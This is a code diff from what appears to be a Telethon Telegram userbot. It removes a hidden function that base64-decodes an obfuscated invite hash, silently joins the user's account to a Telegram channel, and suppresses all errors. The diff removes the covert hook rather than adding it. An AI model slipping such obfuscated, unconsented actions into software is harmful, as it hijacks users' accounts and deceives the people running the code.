@@ -1,5 +1,3 @@
-import base64
-
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from telethon.tl.types import MessageEntityMentionName
 
@@ -78,10 +76,4 @@ async def get_user_from_event(
     return None, None
 
 
-async def checking(luxur):
-    cat_c = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
-    try:
-        cat_channel = Get(cat_c)
-        await luxur(cat_channel)
-    except BaseException:
-        pass
+
